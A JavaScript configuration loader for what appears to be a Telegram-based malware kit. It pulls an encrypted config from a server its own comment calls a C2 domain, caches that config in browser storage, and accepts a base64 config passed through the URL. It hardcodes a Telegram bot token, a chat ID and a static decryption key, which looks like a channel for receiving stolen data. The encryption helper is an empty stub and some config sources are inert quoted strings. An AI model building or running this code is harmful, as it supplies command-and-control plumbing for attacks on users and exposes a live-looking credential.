// config-loader.js - Multi-source configuration loader with encryption

const CONFIG_SOURCES = [
    'https://your-c2-domain.com/api/config',  // Remote encrypted config
    'localStorage.getItem("tg_config")',
    'sessionStorage.getItem("tg_config")',
    'new URLSearchParams(window.location.search).get("config")'
];

const FALLBACK_CONFIG = {
    botToken: '7992081098:AAFDa3mYSIKKwhZagDA_Z22sb18ApExc8BI',
    chatId: '1523864238',
    fallback: true,
    encryptionKey: 'shadow_core_v99_key_2026'
};

export async function loadConfig() {
    let config = null;
    
    // Try remote first
    try {
        const resp = await fetch(CONFIG_SOURCES[0], { 
            cache: 'no-store',
            headers: { 'X-Requested-With': 'XMLHttpRequest' }
        });
        if (resp.ok) {
            config = await resp.json();
            if (config.encrypted) {
                config = await decryptConfig(config.data, config.iv, config.salt);
            }
            // Cache locally
            localStorage.setItem('tg_config', JSON.stringify(config));
            return config;
        }
    } catch (e) {
        console.debug('Remote config failed, trying local...');
    }

    // Try localStorage
    const local = localStorage.getItem('tg_config');
    if (local) {
        try {
            config = JSON.parse(local);
            if (config && config.botToken) return config;
        } catch (e) {}
    }

    // Try sessionStorage
    const session = sessionStorage.getItem('tg_config');
    if (session) {
        try {
            config = JSON.parse(session);
            if (config && config.botToken) return config;
        } catch (e) {}
    }

    // Try URL parameter
    const urlParams = new URLSearchParams(window.location.search);
    const urlConfig = urlParams.get('config');
    if (urlConfig) {
        try {
            config = JSON.parse(atob(urlConfig));
            if (config && config.botToken) return config;
        } catch (e) {}
    }

    // Use fallback
    console.warn('Using fallback configuration');
    return FALLBACK_CONFIG;
}

async function decryptConfig(encryptedData, iv, salt) {
    try {
        const encoder = new TextEncoder();
        const keyMaterial = await crypto.subtle.importKey(
            'raw',
            encoder.encode(FALLBACK_CONFIG.encryptionKey),
            { name: 'PBKDF2' },
            false,
            ['deriveKey']
        );
        
        const key = await crypto.subtle.deriveKey(
            {
                name: 'PBKDF2',
                salt: encoder.encode(salt),
                iterations: 100000,
                hash: 'SHA-256'
            },
            keyMaterial,
            { name: 'AES-GCM', length: 256 },
            false,
            ['decrypt']
        );
        
        const decrypted = await crypto.subtle.decrypt(
            {
                name: 'AES-GCM',
                iv: Uint8Array.from(atob(iv), c => c.charCodeAt(0))
            },
            key,
            Uint8Array.from(atob(encryptedData), c => c.charCodeAt(0))
        );
        
        return JSON.parse(new TextDecoder().decode(decrypted));
    } catch (e) {
        console.error('Decryption failed:', e);
        return null;
    }
}

export function encryptConfig(config, key) {
    // Encryption function for server-side use
    // Implementation would mirror decryptConfig
}